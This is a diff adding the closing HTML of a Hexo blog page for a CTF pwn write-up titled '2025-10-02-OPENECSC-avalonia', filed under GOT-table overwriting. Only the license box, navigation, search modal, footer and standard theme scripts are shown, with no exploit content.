+  <a href="/categories/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E8%A6%86%E5%86%99GOT%E8%A1%A8/" class="category-chain-item">覆写GOT表</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2025-10-02-OPENECSC-avalonia</div>
+      <div>http://0x4a-210.github.io/2025/10/07/pwn刷题记录/其他技巧类/覆写GOT表/2025-10-02-OPENECSC-avalonia/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 7, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/03/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3/2025-10-02-OPENECSC-cfp/" title="2025-10-02-OPENECSC-cfp">
+                        <span class="hidden-mobile">2025-10-02-OPENECSC-cfp</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
